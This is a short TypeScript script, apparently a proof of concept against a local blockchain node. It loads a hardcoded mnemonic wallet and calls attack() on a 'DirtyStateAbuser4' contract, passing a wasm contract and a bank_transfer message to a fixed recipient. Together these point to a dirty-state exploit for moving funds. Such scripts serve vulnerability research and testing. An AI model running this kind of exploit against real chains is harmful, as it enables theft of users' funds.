import { HDNodeWallet, JsonRpcProvider, toUtf8Bytes } from "ethers";
import { DirtyStateAbuser4__factory } from "../../typechain-types";

// connects to local node
const jsonRpcProvider = new JsonRpcProvider("http://localhost:8545");

// mnemonic for the HD wallet
const mnemonic = "guard cream sadness conduct invite crumble clock pudding hole grit liar hotel maid produce squeeze return argue turtle know drive eight casino maze host"
const owner = HDNodeWallet.fromPhrase(mnemonic, "", "m/44'/118'/0'/0/0").connect(jsonRpcProvider)

// get command line arguments
const COMMAND_LINE_ARGS = process.argv.slice(2)
const attackContract = COMMAND_LINE_ARGS[0]
const wasmContract = COMMAND_LINE_ARGS[1]

async function main() {
  const contract = DirtyStateAbuser4__factory.connect(attackContract, owner)
  console.log("contract address: ", await contract.getAddress())

  const msgBz = toUtf8Bytes(JSON.stringify({
    "bank_transfer": {
      "recipient": "nibi1gc6vpl9j0ty8tkt53787zps9ezc70kj88hluw4",
    }
  }));

  const txResponse = await contract.attack(wasmContract, msgBz, {
    gasLimit: 9_000_864_030_308,
    gasPrice: 1,
  })
  console.log("tx: ", txResponse)
  const txReceipt = await jsonRpcProvider.waitForTransaction(txResponse.hash)
  console.log("txReceipt: ", txReceipt)

  const counter = await contract.getCounter();
  console.log("Counter: ", counter.toString());
}

main()